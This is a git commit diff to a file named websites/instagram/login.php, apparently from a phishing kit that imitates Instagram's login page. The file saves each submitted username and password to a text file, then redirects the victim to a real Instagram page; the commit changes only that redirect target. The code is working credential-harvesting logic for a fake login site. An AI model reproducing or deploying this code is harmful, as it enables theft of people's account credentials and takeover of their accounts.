b3acf409bad6c4ca99209967776dc7361c439b0e
Nilesh-kat <65418593+Nilesh-kat@users.noreply.github.com>
2020-09-27 18:06:52 +0530

    Update login.php

--- websites/instagram/login.php
+++ websites/instagram/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+header('Location: https://www.instagram.com/p/CFo9mTChhWyHNfojna6r2gARv8EabBRFpq92z00/');
 exit();
